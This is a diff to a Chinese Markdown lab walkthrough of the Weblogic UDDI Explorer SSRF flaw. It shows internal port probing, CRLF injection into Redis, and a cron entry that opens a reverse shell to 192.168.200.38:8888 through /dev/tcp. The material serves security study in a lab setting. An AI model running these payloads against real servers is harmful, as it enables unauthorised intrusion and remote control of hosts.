@@ -8,16 +8,24 @@
 Weblogic中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件。SSRF漏洞存在于`http://192.168.200.38:7001/uddiexplorer/SearchPublicRegistries.jsp`
 访问一个可以访问的IP:PORT，如http://127.0.0.1:7001
 可访问的端口将会得到错误，一般是返回status code（如下图），如果访问的非http协议，则会返回did not have a valid SOAP content-type。
+
 ![image.png](.//SSRF 示例（weblogic SSRF）.assets/2023_05_19_10_39_44_NSdKtc8R.png)
+
 修改为一个不存在的端口，将会返回could not connect over HTTP to server
+
 ![image.png](.//SSRF 示例（weblogic SSRF）.assets/2023_05_19_10_39_45_0JSfnBWX.png)
+
 通过错误的不同，即可探测内网状态。
+
 ## 漏洞利用
 ### 注入HTTP头，利用Redis反弹shell
 Weblogic的SSRF有一个比较大的特点，其虽然是一个“GET”请求，但是我们可以通过传入`%0d%0a`来注入换行符，而某些服务（如redis写入计划任务(需要运行在centos上，Ubuntu的定时任务会预检格式是否正确，格式不正确无法启动，由于redis备份文件会带上redis特定的标识，所以Ubuntu不能实现定时任务反弹shell)）是通过换行符来分隔每条命令，也就说我们可以通过该SSRF攻击内网中的redis服务器。
 首先，通过ssrf探测内网中的redis服务器（redis服务在172.21.0.2）
+
 ![image.png](.//SSRF 示例（weblogic SSRF）.assets/2023_05_19_10_39_46_QqXmKryi.png)
+
 确定存在redis服务之后，通过注入换行符来写入命令至计划任务
+
 ```shell
 set 1 "\n\n\n\n0-59 0-23 1-31 1-12 0-6 root bash -c 'sh -i >& /dev/tcp/192.168.200.38/8888 0>&1'\n\n\n\n"
 config set dir /etc/
@@ -44,9 +52,15 @@ Upgrade-Insecure-Requests: 1
 
 ```
 实际redis服务接收到的请求如下图所示
+
 ![image.png](.//SSRF 示例（weblogic SSRF）.assets/2023_05_19_10_39_47_JDVAE1go.png)
+
 写入计划任务后，执行反弹shell命令如下所示
+
 ![image.png](.//SSRF 示例（weblogic SSRF）.assets/2023_05_19_10_39_47_NcODZRIa.png)
+
+
+
 ## 其他
 **最后补充一下，可进行利用的cron有如下几个地方：**
 
